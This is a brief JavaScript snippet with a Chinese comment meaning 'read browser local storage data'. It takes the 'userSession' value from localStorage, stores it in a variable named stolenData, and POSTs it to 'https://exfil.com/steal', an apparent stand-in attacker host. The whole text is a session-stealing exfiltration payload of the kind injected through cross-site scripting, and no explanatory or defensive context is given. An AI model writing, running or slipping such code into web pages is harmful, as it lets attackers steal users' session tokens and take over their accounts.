
// 读取浏览器本地存储数据
const stolenData = localStorage.getItem('userSession');
fetch('https://exfil.com/steal', {
  method: 'POST',
  body: stolenData
});
